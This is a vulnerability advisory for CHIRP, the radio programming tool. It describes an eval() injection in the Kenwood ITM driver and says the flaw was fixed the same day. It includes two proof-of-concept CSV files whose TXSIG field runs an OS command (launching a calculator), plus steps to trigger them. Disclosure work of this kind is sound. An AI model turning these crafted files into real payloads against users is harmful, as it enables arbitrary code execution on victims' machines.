# CHIRP — Arbitrary Code Execution via `eval()` in Kenwood ITM Driver

**Product:** CHIRP (all versions containing `chirp/drivers/kenwood_itm.py`)  
**Vendor:** kk7ds / CHIRP project — https://github.com/kk7ds/chirp  
**Confirmed on:** chirp-next-20260814 (commit cb7d5e2); code unchanged since 2012 
**Fixed on** Commit 39178db  
**CWE:** CWE-95 (Eval Injection)  

---

## Overview

CHIRP's Kenwood ITM file format driver passes raw CSV field values from an opened file directly to Python's built-in `eval()` with no validation. An attacker who delivers a crafted file to a CHIRP user achieves arbitrary code execution as the victim user.

## Root Cause

`chirp/drivers/kenwood_itm.py`, `_clean_tmode()`, lines 66–67:

```python
def _clean_tmode(self, headers, line, mem):
    rtone = eval(generic_csv.get_datum_by_header(headers, line, "TXSIG"))  # SINK
    ctone = eval(generic_csv.get_datum_by_header(headers, line, "RXSIG"))  # SINK
```

The TXSIG and RXSIG values come directly from a CSV row in the opened file. No type check, allowlist, or sandboxing is applied before `eval()`.

## POCs

Below are two POCs. 



### Malicious `.itm`

```
// Malicious .itm POC
CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
1,1,146.520000,146.520000,PoC,__import__('os').system('calc'),0
```

### Malicious `.img`

```
// Malicious .img POC
CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
1,0,146520000,146520000,EVIL,__import__('os').system('calc.exe'),0

 chirpεimgeyJyY2xhc3MiOiAiSVRNUmFkaW8iLCAidmVuZG9yIjogIktlbndvb2QiLCAibW9kZWwiOiAiSVRNIiwgInZhcmlhbnQiOiAiIiwgImNoaXJwX3ZlcnNpb24iOiAiZGFpbHktMjAyMzAxMDEifQ==
```

### Triggering in CHIRP

1. Launch CHIRP.
2. **File → Open**.
3. Select `{file_name}.img`. _If using the .itm payload, change the filter dropdown to **"All Files"** (ITM is not filtered for in CHIRP)._
5. Select `{file_name}.itm`.


## Disclosure

| Date |  
|---|---|  
| 2026-08-17 | Both vectors discovered and runtime-confirmed |
| 2026-08-17 | POCs and disclosure report prepared |
| 2026-08-17 | Initial report sent to dsmith@danplanet.com |
| 2026-08-17 | Responded and fixed same day. https://github.com/kk7ds/chirp/commit/39178dbfc4fece083ab9ed20286d6ae3a91a718e

